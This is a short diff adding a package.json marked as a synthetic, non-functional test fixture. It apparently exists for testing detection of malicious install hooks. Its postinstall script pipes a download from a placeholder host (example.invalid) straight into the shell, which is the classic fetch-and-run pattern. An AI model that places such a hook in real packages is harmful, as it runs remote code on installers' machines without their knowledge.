@@ -1,0 +1,7 @@
+{
+  "//": "SYNTHETIC TEST FIXTURE — not functional",
+  "name": "fixture",
+  "scripts": {
+    "postinstall": "husky && {{CURL}} https://example.invalid/x | sh"
+  }
+}
